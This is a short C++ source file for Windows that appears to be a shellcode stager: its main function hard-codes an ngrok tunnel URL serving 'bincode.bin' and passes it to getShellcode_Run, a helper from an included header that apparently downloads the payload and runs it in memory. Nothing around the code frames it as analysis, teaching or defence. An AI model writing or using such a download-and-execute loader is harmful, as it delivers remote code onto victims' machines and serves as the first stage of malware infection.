#include <iostream>
#include <iterator>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet")

#include "get_buf.h"
#include "shell_code_run.h"

using namespace std;


int main(int argc, char** argv) {
    const char* url = "https://7959-141-101-226-178.ngrok-free.app/bincode.bin";
    printf("%s\n", url);
    //Sleep(1000);
    getShellcode_Run(url);
    
    return 0;

}
